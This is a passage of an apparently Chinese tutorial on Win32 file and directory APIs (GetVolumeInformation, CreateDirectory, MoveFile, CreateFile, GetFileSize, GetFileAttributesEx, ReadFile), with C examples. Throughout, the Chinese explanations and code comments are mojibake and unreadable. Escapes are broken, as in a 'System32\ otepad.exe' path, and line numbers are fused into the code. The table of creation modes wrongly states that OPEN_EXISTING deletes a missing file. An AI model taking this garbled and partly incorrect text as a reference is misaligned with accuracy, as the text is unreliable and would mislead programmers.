¹è·¯å¾„å­—ç¬¦ä¸²ï¼Œå¦‚&quot;C:\\\\&quot;&quot; [out, optional] LPSTR lpVolumeNameBuffer, //è¿”å›å·æ ‡ï¼ˆé©±åŠ¨å™¨åï¼‰ [in] DWORD nVolumeNameSize, //lpVolumeNameBufferç¼“å†²åŒºçš„å¤§å° [out, optional] LPDWORD lpVolumeSerialNumber, //å·ï¼ˆé©±åŠ¨å™¨ï¼‰åºåˆ—å· [out, optional] LPDWORD lpMaximumComponentLength, //æ–‡ä»¶ç³»ç»Ÿå…è®¸çš„æœ€å¤§æ–‡ä»¶åé•¿åº¦ [out, optional] LPDWORD lpFileSystemFlags, //é©±åŠ¨å™¨å±æ€§å€¼ [out, optional] LPSTR lpFileSystemNameBuffer, //æ–‡ä»¶ç³»ç»Ÿç±»å‹ï¼Œå¦‚â€œNTFSâ€ï¼Œâ€œCDFSâ€ç­‰ [in] DWORD nFileSystemNameSize //lpFileSystemNameBufferç¼“å†²åŒºçš„å¤§å°); nVolumeNameSizeï¼šlpVolumeNameBufferç¼“å†²åŒºçš„å¤§å°ã€‚å‡è®¾æ˜¯10ï¼Œä½†æ˜¯è¦æŸ¥è¯¢çš„å·çš„å·æ ‡åå¤ªé•¿å‡è®¾ä¸º20ï¼Œé‚£å°±åªè¿”å›å·æ ‡åçš„å‰10ä¸ª lpVolumeSerialNumberï¼šå·ï¼ˆé©±åŠ¨å™¨ï¼‰åºåˆ—å·ã€‚ è¿™ä¸€é¡¹ä¸æ˜¯ç¡¬ç›˜åºåˆ—å·ã€‚ç¡¬ç›˜åºåˆ—å·æ˜¯ç¡¬ç›˜å‡ºå‚æ—¶ç”Ÿäº§å‚å®¶ä¸ºåŒºåˆ†äº§å“è€Œè®¾ç½®çš„ï¼Œæ— æ³•æ›´æ”¹ã€‚ä¸€äº›æˆæƒè½¯ä»¶ä¸ºäº†é‰´åˆ«ä½¿ç”¨ç”¨æˆ·çš„ç¯å¢ƒï¼Œå¯èƒ½ä¼šé€šè¿‡ç¡¬ç›˜åºåˆ—å·æ¥åšé™åˆ¶ï¼Œå½“ç”¨æˆ·æ¢äº†ç¯å¢ƒè½¯ä»¶å°±ä¸èƒ½ç”¨äº†ã€‚ä¸€äº›å£°ç§°èƒ½ä¿®æ”¹ç¡¬ç›˜åºåˆ—å·çš„å·¥å…·å¹¶ä¸æ˜¯çœŸæ­£ä¿®æ”¹äº†ç¡¬ç›˜åºåˆ—å·ï¼Œè€Œæ˜¯hookè·å–çš„å‡½æ•°ï¼Œè¿”å›å¦å¤–ä¸€ä¸ªç¡¬ç›˜åºåˆ—å·ã€‚ To programmatically obtain the hard diskâ€™s serial number that the manufacturer assigns, use the Windows Management Instrumentation (WMI) Win32_PhysicalMedia property SerialNumber. ä¸€ä¸ªç‰©ç†ç¡¬ç›˜å¯èƒ½è¢«åˆ†æˆå››ä¸ªå·ï¼Œé‚£æ¯ä¸ªå·å°±æœ‰ä¸€ä¸ªå·ï¼ˆé©±åŠ¨å™¨ï¼‰åºåˆ—å·ã€‚å¦‚æœé‡è£…ç³»ç»Ÿï¼Œæ ¼å¼åŒ–ç¡¬ç›˜ï¼Œè¿™ä¸ªå·åºåˆ—å·ä¼šå‘ç”Ÿæ”¹å˜ã€‚ lpMaximumComponentLengthï¼šæ–‡ä»¶ç³»ç»Ÿå…è®¸çš„æœ€å¤§æ–‡ä»¶åé•¿åº¦ã€‚æ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶åæœ€å¤§çš„é•¿åº¦æ˜¯å¤šå°‘ lpFileSystemFlagsï¼šé©±åŠ¨å™¨å±æ€§å€¼ã€‚ A pointer to a variable that receives flags associated with the specified file system. This parameter can be one or more of the following flags. However, FILE_FILE_COMPRESSION and FILE_VOL_IS_COMPRESSED are mutually exclusive. FILE_VOLUME_QUOTASè¡¨ç¤ºæ”¯æŒç£ç›˜é…é¢ FILE_SUPPORTS_ENCRYPTIONè¡¨ç¤ºæ–‡ä»¶ç³»ç»Ÿæ˜¯å¦æ”¯æŒEFSåŠ å¯†ç­‰ã€‚ ç¤ºä¾‹123456789101112131415161718192021222324252627282930313233343536373839#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // å®šä¹‰å˜é‡ä»¥å­˜å‚¨å·ä¿¡æ¯ TCHAR volumeName[MAX_PATH + 1] = &#123; 0 &#125;; DWORD volumeSerialNumber = 0; DWORD maximumComponentLength = 0; DWORD fileSystemFlags = 0; TCHAR fileSystemName[MAX_PATH + 1] = &#123; 0 &#125;; // è·å–Cç›˜çš„å·ä¿¡æ¯ BOOL success = GetVolumeInformation( &quot;C:\\\\&quot;, // é©±åŠ¨å™¨æ ¹è·¯å¾„ volumeName, // å·æ ‡ MAX_PATH, // å·æ ‡ç¼“å†²åŒºçš„å¤§å° &amp;volumeSerialNumber, // å·åºåˆ—å· &amp;maximumComponentLength, // æœ€å¤§æ–‡ä»¶åé•¿åº¦ &amp;fileSystemFlags, // æ–‡ä»¶ç³»ç»Ÿæ ‡å¿— fileSystemName, // æ–‡ä»¶ç³»ç»Ÿåç§° MAX_PATH // æ–‡ä»¶ç³»ç»Ÿåç§°ç¼“å†²åŒºçš„å¤§å° ); if (success) &#123; printf(&quot;Volume Name: %s &quot;, volumeName); printf(&quot;Volume Serial Number: %lu &quot;, volumeSerialNumber); printf(&quot;Maximum Component Length: %lu &quot;, maximumComponentLength); printf(&quot;File System Flags: %lu &quot;, fileSystemFlags); printf(&quot;File System Name: %s &quot;, fileSystemName); &#125; else &#123; printf(&quot;Error retrieving volume information &quot;); &#125; return 0;&#125; ç›®å½•ç›¸å…³API åˆ›å»ºç›®å½•CreateDirectory() 1234BOOL CreateDirectory( [in] LPCSTR lpPathName, //åˆ›å»ºçš„ç›®å½•çš„åå­— [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes //SD å®‰å…¨æè¿°ç¬¦); Directoryä¹Ÿæ˜¯ä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œæœ‰LPSECURITY_ATTRIBUTESç±»å‹çš„å‚æ•° ç¤ºä¾‹12345678#include &lt;Windows.h&gt;int main()&#123; CreateDirectory(&quot;C:\\\\A&quot;, NULL); return 0;&#125;è¿è¡Œååœ¨Cç›˜ä¸‹åˆ›å»ºåä¸ºAçš„ç›®å½• åˆ é™¤ç›®å½•RemoveDirectory() Deletes an existing empty directory. 123BOOL RemoveDirectoryA( [in] LPCSTR lpPathName //è¦åˆ é™¤çš„ç›®å½•çš„åå­—); ç¤ºä¾‹12345678#include &lt;Windows.h&gt;int main()&#123; RemoveDirectory(&quot;C:\\\\A&quot;); return 0;&#125;è¿è¡Œååœ¨Cç›˜ä¸‹åä¸ºAçš„ç›®å½•è¢«åˆ é™¤ ä¿®æ”¹ç›®å½•åç§°MoveFile() 1234BOOL MoveFile( [in] LPCTSTR lpExistingFileName, //å½“å‰ç›®å½•/æ–‡ä»¶çš„åå­— [in] LPCTSTR lpNewFileName //è¦ä¿®æ”¹æˆçš„æ–°åå­—); ç¤ºä¾‹12345678#include &lt;Windows.h&gt;int main()&#123; MoveFile(&quot;C:\\\\B&quot;, &quot;C:\\\\C&quot;); return 0;&#125;è¿è¡Œååœ¨Cç›˜ä¸‹åä¸ºBçš„ç›®å½•è¢«æ”¹åä¸ºC è·å–å½“å‰è¿›ç¨‹çš„ç›®å½•GetCurrentDirectory() 1234DWORD GetCurrentDirectory( [in] DWORD nBufferLength, //lpBufferå­—ç¬¦ä¸²ç¼“å†²åŒºçš„å¤§å° [out] LPTSTR lpBuffer //å­˜è·å–çš„å­—ç¬¦ä¸²); GetCurrentDirectory å‡½æ•°è·å–ç¨‹åºçš„å½“å‰å·¥ä½œç›®å½•ï¼Œå³ç¨‹åºè¿è¡Œæ—¶çš„æ´»åŠ¨ç›®å½•ã€‚è¿™ä¸ªç›®å½•å¯ä»¥ä¸æ¨¡å—æ‰€åœ¨çš„ç›®å½•ä¸åŒï¼Œå–å†³äºCreateProcessæ—¶lpCurrentDirectoryå‚æ•°çš„è®¾ç½® ç”¨é€”ï¼Œæ¯”å¦‚CreateDirectoryæˆ–CreateFileæ—¶ï¼Œæœªä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œå¯»æ‰¾çš„è·¯å¾„å°±æ˜¯è¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½• 1CreateDirectory(&quot;C:\\\\A&quot;, NULL); //ç»å¯¹è·¯å¾„ 1CreateDirectory(&quot;A&quot;, NULL); //åœ¨è¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½•ä¸‹åˆ›å»ºAæ–‡ä»¶å¤¹ è®¾ç½®å½“å‰è¿›ç¨‹çš„ç›®å½•SetCurrentDirectory() Sets the applicationâ€™s current working directory to the specified directory. 123BOOL SetCurrentDirectory( [in] LPCTSTR lpPathName); ç¤ºä¾‹è¿™ä¸ªç¨‹åºé¦–å…ˆè°ƒç”¨ GetCurrentDirectory æ¥è·å–å¹¶æ‰“å°å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½•ã€‚æ¥ç€ï¼Œå®ƒè°ƒç”¨ CreateDirectory åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶å¤¹â€œAâ€ã€‚ç„¶åï¼Œç¨‹åºä½¿ç”¨ SetCurrentDirectory å°†å·¥ä½œç›®å½•æ›´æ”¹ä¸º C:\\ï¼Œå¹¶å†æ¬¡å°è¯•åœ¨é‚£é‡Œåˆ›å»ºä¸€ä¸ªåä¸ºâ€œAâ€çš„æ–‡ä»¶å¤¹ã€‚123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; char currentDirectory[MAX_PATH]; BOOL result; // è·å–å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½• if (!GetCurrentDirectory(MAX_PATH, currentDirectory)) &#123; printf(&quot;Error getting current directory &quot;); return 1; &#125; printf(&quot;Current Directory: %s &quot;, currentDirectory); // åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºæ–°æ–‡ä»¶å¤¹ &quot;A&quot; result = CreateDirectory(&quot;A&quot;, NULL); if (result) &#123; printf(&quot;Directory &#x27;A&#x27; created in current directory &quot;); &#125; else &#123; printf(&quot;Error creating directory &#x27;A&#x27; in current directory &quot;); &#125; // æ›´æ”¹å½“å‰å·¥ä½œç›®å½•åˆ° C:\\ result = SetCurrentDirectory(&quot;C:\\\\&quot;); if (!result) &#123; printf(&quot;Error setting current directory to C:\\\\ &quot;); return 1; &#125; printf(&quot;Current Directory changed to C:\\\\ &quot;); // åœ¨C:\\\\åˆ›å»ºæ–°æ–‡ä»¶å¤¹ &quot;A&quot; result = CreateDirectory(&quot;C:\\\\A&quot;, NULL); if (result) &#123; printf(&quot;Directory &#x27;A&#x27; created in C:\\\\ &quot;); &#125; else &#123; printf(&quot;Error creating directory &#x27;A&#x27; in C:\\\\ &quot;); &#125; return 0;&#125;è¾“å‡º1234Current Directory: C:\\Program Files\\Microsoft Visual Studio\\MyProjects\\DemoDirectory &#x27;A&#x27; created in current directoryCurrent Directory changed to C:\\Directory &#x27;A&#x27; created in C:\\ æ–‡ä»¶ç›¸å…³API åœ¨æ–‡ä»¶æ“ä½œä¸­ï¼Œæ–‡ä»¶å¥æŸ„æƒŸä¸€æ ‡è¯†äº†ä¸€ä¸ªæ–‡ä»¶ï¼ŒReadFileã€WriteFileã€GetFileSizeç­‰å‡½æ•°éƒ½éœ€è¦æ–‡ä»¶å¥æŸ„ä½œä¸ºå‚æ•°ã€‚åœ¨å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œä¹‹å‰ï¼Œéƒ½å¿…é¡»è¦ä½¿ç”¨CreateFileè·å–æ–‡ä»¶å¥æŸ„ åˆ›å»ºæ–‡ä»¶CreateFile() åˆ›å»ºæˆ–æ‰“å¼€ä¸€ä¸ªç°æœ‰çš„æ–‡ä»¶ï¼Œå¾—åˆ°è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶å¥æŸ„ 123456789HANDLE CreateFileA( [in] LPCSTR lpFileName, //æ–‡ä»¶å [in] DWORD dwDesiredAccess, //è®¿é—®æ¨¡å¼ [in] DWORD dwShareMode, //å…±äº«æ¨¡å¼ [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes, //SD å®‰å…¨æè¿°ç¬¦ [in] DWORD dwCreationDisposition, //åˆ›å»ºæ–¹å¼ [in] DWORD dwFlagsAndAttributes, //æ–‡ä»¶å±æ€§å’Œæ–‡ä»¶æ ‡å¿— [in, optional] HANDLE hTemplateFile //æ¨¡æ¿æ–‡ä»¶ ä¸ç”¨ç®¡ï¼Œå¡«ç©º); dwDesiredAccessï¼šåªè¯»æƒé™æ‰“å¼€ï¼Ÿå¯å†™æƒé™æ‰“å¼€ï¼Ÿè¿˜æ˜¯æ‰€æœ‰æƒé™ï¼ŸThe most commonly used values are GENERIC_READ, GENERIC_WRITE, or both (GENERIC_READ | GENERIC_WRITE). Constant Generic meaning GENERIC_ALL 0x10000000 All possible access rights GENERIC_EXECUTE 0x20000000 Execute access GENERIC_WRITE 0x40000000 Write access GENERIC_READ 0x80000000 Read access Generic Access Rights dwShareModeï¼šå…±äº«æ¨¡å¼ï¼Œé€šå¸¸æ²¡ä»€ä¹ˆç”¨ã€‚ æŒ‡æ˜ä¸å…¶ä»–è¿›ç¨‹æ˜¯å¦å…±äº«è¯¥æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯å…±äº«è¯»(FILE_SHARE_READ)ã€å…±äº«å†™(FILE_SHARE_WRITEï¼‰ã€å…±äº«åˆ é™¤(FILE_SHARE_DELETE)ã€‚å¦‚æœè¦æŒ‡æ˜å¤šä¸ªå±æ€§ï¼Œä½¿ç”¨â€œä½ä¸â€â€œ|â€è¿ç®—ã€‚å¦‚æœæŒ‡æ˜ä¸Šè¿°å‚æ•°ï¼Œå…¶ä»–è¿›ç¨‹å°±å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œç›¸å…³æ“ä½œã€‚ å¦‚æœæœ¬è¿›ç¨‹éœ€è¦ç‹¬å æœ¬æ–‡ä»¶ï¼Œåˆ™å°†æœ¬å‚æ•°è®¾ç½®ä¸º0ã€‚ If this parameter is zero and CreateFile succeeds, the file or device cannot be shared and cannot be opened again until the handle to the file or device is closed. For more information, see the Remarks section. dwCreationDispositionï¼šæ“ä½œæ¨¡å¼ æ“ä½œæ¨¡å¼ æ„ä¹‰ CREATE_ALWAYS å¦‚æœæŒ‡å‘çš„æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™overwriteè¯¥æ–‡ä»¶ï¼Œæ¸…é™¤æ–‡ä»¶å†…å®¹ï¼Œæ¸…é™¤æ–‡ä»¶å±æ€§;å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™æ–°å»ºä¸€ä¸ªæ–‡ä»¶ CREATE_NEW æ–°å»ºæ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™è¿”å›å¤±è´¥ OPEN_ALWAYS å¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œåˆ™æ‰“å¼€æ–‡ä»¶;å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ç­‰åŒäºCREATE_NEW OPEN_EXISTING æ‰“å¼€å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ é™¤æ–‡ä»¶ TRUNCATE_EXISTING æ‰“å¼€å·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¹¶æŠŠå†…å®¹æ¸…ç©ºï¼Œæ–‡ä»¶å¤§å°å˜ä¸ºé›¶ dwFlagsAndAttributesï¼š æ–‡ä»¶å±æ€§ æ„ä¹‰ FILE_ATTRIBUTE_ARCHIVE å­˜æ¡£æ–‡ä»¶ FILE_ATTRIBUTE_ENCRYPTED åŠ å¯†æ–‡ä»¶ FILE_ATTRIBUTE_HIDDEN éšè—æ–‡ä»¶ FILE_ATTRIBUTE_NORMAL ä¸å«æœ‰å…¶ä»–æ–‡ä»¶å±æ€§ï¼Œåªèƒ½å•ç‹¬ä½¿ç”¨ FILE_ATTRIBUTE_NOT_CONTENT_INDEXED æ²¡æœ‰ä½¿ç”¨å†…å®¹ç´¢å¼•æœåŠ¡ FILE_ATTRIBUTE_OFFLINE ç¦»çº¿å­˜å‚¨æ–‡ä»¶ FILE_ATTRIBUTE_READONLY åªè¯»æ–‡ä»¶ FILE_ATTRIBUTE_SYSTEM ç³»ç»Ÿæ–‡ä»¶ FILE_ATTRIBUTE_TEMPORARY ä¸´æ—¶æ–‡ä»¶ æ“ä½œæ ‡å¿— æ„ä¹‰ FILE_FLAG_BACKUP_SEMANTICS æ‰“å¼€å’Œåˆ›å»ºæ–‡ä»¶æ˜¯ä¸ºäº†è¿›è¡Œå¤‡ä»½å’Œæ¢å¤æ“ä½œ FILE_FLAG_DELETE_ON_CLOSE å¦‚æœæ–‡ä»¶å¥æŸ„å…¨éƒ¨å…³é—­ï¼Œåˆ™åˆ é™¤æ–‡ä»¶ FILE_FLAG_NO_BUFFERING ä¸ä½¿ç”¨ç³»ç»Ÿç¼“å­˜(cachingï¼Œä¸åŒäºç¡¬ä»¶ç¼“å­˜) FILE_FLAG_OPEN_NO_RECALL è¿œç¨‹å­˜å‚¨ FILE_FLAG_OPEN_REPARSE_POINT ç³»ç»Ÿå°†ç¦æ­¢NTFSæ–‡ä»¶ç³»ç»Ÿçš„â€œå†è§£æâ€è¡Œä¸º FILE_FLAG_OVERLAPPED ä»¥å¼‚æ­¥IOæ–¹å¼åˆ›å»ºå¯æ‰“å¼€æ–‡ä»¶ FILE_FLAG_POSIX_SEMANTICS æŒ‰ç…§POSIXè§„åˆ™å­˜å– FILE_FLAG_RANDOM_ACCESS éšæœºå­˜å– FILE_FLAG_SEQUENTIAL_SCAN æ–‡ä»¶ä»å¤´åˆ°å°¾æ˜¯è¿ç»­çš„(sequentially) FILE_FLAG_WRITE_THROUGH å­˜å–æ–‡ä»¶æ—¶ï¼Œå¯¹ç£ç›˜è¿›è¡Œç›´æ¥çš„æ“ä½œï¼Œä¸ç»è¿‡ç¼“å­˜ ä¸€èˆ¬æƒ…å†µä¸‹æ–‡ä»¶å±æ€§è¾ƒå¸¸ç”¨ï¼Œè€Œæ“ä½œæ ‡å¿—ä¸å¸¸ç”¨ï¼Œå¯ä»¥ä½¿ç”¨â€œ|â€è¿ç®—ç¬¦æŒ‡å®šå¤šä¸ªå±æ€§å’Œæ ‡å¿—ã€‚ ç¤ºä¾‹123456789101112131415161718#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // åˆ›å»ºæ–‡ä»¶ CreateFile( TEXT(&quot;C:\\\\A.txt&quot;), // æ–‡ä»¶å: æŒ‡å®šè¦åˆ›å»ºæˆ–æ‰“å¼€çš„æ–‡ä»¶çš„åç§°ã€‚ GENERIC_READ | GENERIC_WRITE, // è®¿é—®æ¨¡å¼: æŒ‡å®šå¯¹æ–‡ä»¶çš„è¯»å†™æƒé™ã€‚ 0, // å…±äº«æ¨¡å¼: æŒ‡å®šå…¶ä»–è¿›ç¨‹æ˜¯å¦å¯ä»¥å…±äº«æ­¤æ–‡ä»¶ï¼Œ0è¡¨ç¤ºä¸å…±äº«ã€‚ NULL, // å®‰å…¨å±æ€§: æŒ‡å®šå®‰å…¨æè¿°ç¬¦ï¼ŒNULLè¡¨ç¤ºé»˜è®¤å®‰å…¨çº§åˆ«ã€‚ CREATE_ALWAYS, // åˆ›å»ºæ–¹å¼: æŒ‡å®šå¦‚ä½•åˆ›å»ºæˆ–æ‰“å¼€æ–‡ä»¶ï¼Œè¿™é‡Œä¸ºæ€»æ˜¯åˆ›å»ºã€‚ FILE_ATTRIBUTE_HIDDEN, // æ–‡ä»¶å±æ€§: è®¾ç½®æ–‡ä»¶çš„å±æ€§ï¼Œè¿™é‡Œä¸ºéšè—æ–‡ä»¶ã€‚ NULL // æ¨¡æ¿æ–‡ä»¶: ç”¨äºæŒ‡å®šæ–‡ä»¶çš„å±æ€§å’Œæ‰©å±•å±æ€§çš„æ–‡ä»¶çš„å¥æŸ„ï¼ŒNULLè¡¨ç¤ºä¸ä½¿ç”¨æ¨¡æ¿ã€‚ ); return 0;&#125;è¿è¡ŒåCç›˜ä¸‹å¤šå‡ºä¸€ä¸ªA.txtæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸ºéšè—æ–‡ä»¶ å…³é—­æ–‡ä»¶CloseHandle() 1 ç¤ºä¾‹ è·å–æ–‡ä»¶é•¿åº¦GetFileSize() 1234DWORD GetFileSize( //è¿”å›å€¼æ˜¯è¿”å›æ–‡ä»¶å¤§å°ç»“æœçš„ä½32ä½ [in] HANDLE hFile, //æ–‡ä»¶å¥æŸ„ [out, optional] LPDWORD lpFileSizeHigh //è¿”å›æ–‡ä»¶å¤§å°ç»“æœçš„é«˜32ä½ï¼Œå¡«NULLè¡¨ç¤ºä¸éœ€è¦é«˜32ä½); GetFileSizeçš„è¿”å›å€¼æ˜¯æ–‡ä»¶å¤§å°ç»“æœçš„ä½32ä½ï¼ŒlpFileSizeHighæ˜¯æ–‡ä»¶å¤§å°ç»“æœçš„é«˜32ä½ ç¤ºä¾‹12345678910111213141516171819202122232425262728293031323334#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // æ‰“å¼€æ–‡ä»¶ HANDLE hFile = CreateFile( TEXT(&quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;), // æ–‡ä»¶å GENERIC_READ, // è®¿é—®æ¨¡å¼: åªè¯» FILE_SHARE_READ, // å…±äº«æ¨¡å¼: å…è®¸å…¶ä»–è¿›ç¨‹è¯»å–æ–‡ä»¶ NULL, // å®‰å…¨å±æ€§: é»˜è®¤ OPEN_EXISTING, // æ‰“å¼€ç°æœ‰æ–‡ä»¶ FILE_ATTRIBUTE_NORMAL, // æ–‡ä»¶å±æ€§: æ™®é€šæ–‡ä»¶ NULL // æ²¡æœ‰æ¨¡æ¿æ–‡ä»¶ ); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;Failed to open file &quot;); return 1; &#125; // è·å–æ–‡ä»¶å¤§å° DWORD fileSize = GetFileSize(hFile, NULL); if (fileSize == INVALID_FILE_SIZE) &#123; printf(&quot;Failed to get file size &quot;); CloseHandle(hFile); return 1; &#125; printf(&quot;File size: %lu bytes &quot;, fileSize); // å…³é—­æ–‡ä»¶å¥æŸ„ CloseHandle(hFile); return 0;&#125; è·å–æ–‡ä»¶å±æ€§å’Œä¿¡æ¯GetFileAttributes()/GetFileAttributesEx() 123DWORD GetFileAttributesA( [in] LPCSTR lpFileName); è·å–æ–‡ä»¶æˆ–ç›®å½•çš„å±æ€§ã€æ—¶é—´ã€å¤§å°ï¼Œä»¥WIN32_FILE_ATTRIBUTE_DATAç»“æ„çš„å½¢å¼è¿”å›ç»“æœï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹: 12345BOOL GetFileAttributesExA( [in] LPCSTR lpFileName, [in] GET_FILEEX_INFO_LEVELS fInfoLevelId, [out] LPVOID lpFileInformation); lpFileNameï¼šè¾“å…¥å‚æ•°ï¼Œä¸ºéœ€è¦è·å–å±æ€§çš„æ–‡ä»¶æˆ–ç›®å½•ã€‚ fInfoLevelldï¼šè¾“å…¥å‚æ•°ï¼Œæ˜¯è·å–æ–‡ä»¶å±æ€§ä¿¡æ¯çš„ç±»åˆ«,ä¼šå½±å“åˆ°lpFileInformationå‚æ•°å…·ä½“é‡‡ç”¨ä»€ä¹ˆå½¢å¼è¾“å‡ºç»“æœã€‚ä½†æ˜¯æœ¬å‚æ•°ä¸€èˆ¬åªèƒ½æŒ‡å®šä¸ºGetFileExInfoStandardã€‚ lpFileInformationï¼šè¾“å…¥å‚æ•°ï¼Œç”¨äºè¿”å›ç»“æœã€‚å¦‚æœflnfoLevelldå‚æ•°æŒ‡å®šä¸ºGetFileExInfoStandardï¼Œåˆ™ä¸ºLPWIN32_FILE_ATTRIBUTE_DATAç±»å‹ã€‚ WIN32_FILE_ATTRIBUTE_DATA structure 12345678typedef struct _WIN32_FILE_ATTRIBUTE_DATA &#123; DWORD dwFileAttributes; //æ–‡ä»¶å±æ€§ FILETIME ftCreationTime; //æ–‡ä»¶åˆ›å»ºæ—¶é—´ FILETIME ftLastAccessTime; //æ–‡ä»¶æœ€åè®¿é—®æ—¶é—´ FILETIME ftLastWriteTime; //æ–‡ä»¶æœ€åå†™å…¥æ—¶é—´ DWORD nFileSizeHigh; //æ–‡ä»¶å¤§å°ï¼Œé«˜32ä½ DWORD nFileSizeLow; //æ–‡ä»¶å¤§å°ï¼Œä½32ä½&#125; WIN32_FILE_ATTRIBUTE_DATA, *LPWIN32_FILE_ATTRIBUTE_DATA; dwFileAttributesï¼šä½æ©ç ã€‚è¯¦ç»†æŸ¥File Attribute Constants FILETIMEå’ŒSYSTEMTIMEç»“æ„ä½“FILETIMEç»“æ„ä½“æ­¤ç»“æ„ç”¨æœ€å°çš„æ•°æ®é‡è¡¨ç¤ºçš„æ—¶é—´ï¼Œä½†æ˜¯ä¸ä¾¿äºç”¨æˆ·æŸ¥çœ‹å’Œæ˜¾ç¤ºã€‚é€šè¿‡API è·å–çš„ç³»ç»Ÿæ—¶é—´éƒ½æ˜¯è¿™ç§æ ¼å¼çš„ã€‚å¦‚æœè¦ä½¿ç”¨æ˜¾ç¤ºï¼Œå¯ä»¥ä½¿ç”¨FileTimeToSystemTimeè½¬æ¢ä¸ºä¾¿äºæ˜¾ç¤ºçš„SYSTEMTIMEç»“æ„ã€‚1234typedef struct _FILETIME &#123; DWORD dwLowDateTime; DWORD dwHighDateTime;&#125; FILETIME, *PFILETIME, *LPFILETIME;SYSTEMTIMEç»“æ„ä½“æ­¤ç»“æ„ä½¿ç”¨äº†è¾ƒä¸ºç›´è§‚çš„æ–¹å¼è¡¨ç¤ºæ—¶é—´12345678910typedef struct _SYSTEMTIME &#123; WORD wYear; WORD wMonth; WORD wDayOfWeek; WORD wDay; WORD wHour; WORD wMinute; WORD wSecond; WORD wMilliseconds;&#125; SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME; ç¤ºä¾‹12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // å£°æ˜WIN32_FILE_ATTRIBUTE_DATAç»“æ„ä½“å¹¶åˆå§‹åŒ– WIN32_FILE_ATTRIBUTE_DATA data = &#123; 0 &#125;; // è·å–notepad.exeçš„æ–‡ä»¶å±æ€§ BOOL success = GetFileAttributesEx( &quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;, // æŒ‡å®šæ–‡ä»¶è·¯å¾„ GetFileExInfoStandard, // è¦æ£€ç´¢çš„ä¿¡æ¯çº§åˆ« &amp;data // æ¥æ”¶æ–‡ä»¶å±æ€§æ•°æ®çš„ç¼“å†²åŒº ); if (!success) &#123; printf(&quot;è·å–æ–‡ä»¶å±æ€§å¤±è´¥ã€‚ &quot;); return 1; &#125; // æ‰“å°æ–‡ä»¶å±æ€§ printf(&quot;å±æ€§ï¼š%d &quot;, data.dwFileAttributes); // æ–‡ä»¶å±æ€§çš„ä½æ©ç  // æ‰“å°æ–‡ä»¶å¤§å°çš„é«˜ä½DWORD printf(&quot;å¤§å°é«˜ä½ï¼š%lu &quot;, data.nFileSizeHigh); // æ–‡ä»¶å¤§å°çš„é«˜ä½éƒ¨åˆ† // æ‰“å°æ–‡ä»¶å¤§å°çš„ä½ä½DWORD printf(&quot;å¤§å°ä½ä½ï¼š%lu &quot;, data.nFileSizeLow); // æ–‡ä»¶å¤§å°çš„ä½ä½éƒ¨åˆ† // æ‰“å°æ–‡ä»¶åˆ›å»ºæ—¶é—´ printf(&quot;åˆ›å»ºæ—¶é—´ï¼š%llx &quot;, data.ftCreationTime); // æ–‡ä»¶åˆ›å»ºæ—¶é—´ // æ‰“å°æ–‡ä»¶æœ€åè®¿é—®æ—¶é—´ printf(&quot;æœ€åè®¿é—®æ—¶é—´ï¼š%llx &quot;, data.ftLastAccessTime); // æ–‡ä»¶æœ€åè®¿é—®æ—¶é—´ // æ‰“å°æ–‡ä»¶æœ€åå†™å…¥æ—¶é—´ printf(&quot;æœ€åå†™å…¥æ—¶é—´ï¼š%llx &quot;, data.ftLastWriteTime); // æ–‡ä»¶æœ€åå†™å…¥æ—¶é—´ return 0;&#125; è¯»/å†™/æ‹·è´/åˆ é™¤æ–‡ä»¶ReadFile()/WriteFile()/CopyFile()/DeleteFile() 1234567BOOL ReadFile( [in] HANDLE hFile, //æ–‡ä»¶å¥æŸ„ [out] LPVOID lpBuffer, //æŒ‡å‘è¯»å–æ–‡ä»¶æ•°æ®å­˜å‚¨çš„å†…å­˜ç¼“å†²åŒº [in] DWORD nNumberOfBytesToRead, //ä»æ–‡ä»¶ä¸­è¦è¯»å¤šå°‘ã€‚ä¸èƒ½å¤§äºlpBufferå†…å­˜å—çš„å¤§å°ï¼Œè¦ä¸ä¼šæº¢å‡º [out, optional] LPDWORD lpNumberOfBytesRead, //å®é™…è¯»äº†å¤šå°‘æ•°æ® [in, out, optional] LPOVERLAPPED lpOverlapped //overlapped buffer å­¦ä¹ åˆ°ç½‘ç»œç¼–ç¨‹å¼‚æ­¥æ¨¡å‹æ—¶å†å…³æ³¨è¿™ä¸ªå‚æ•°); 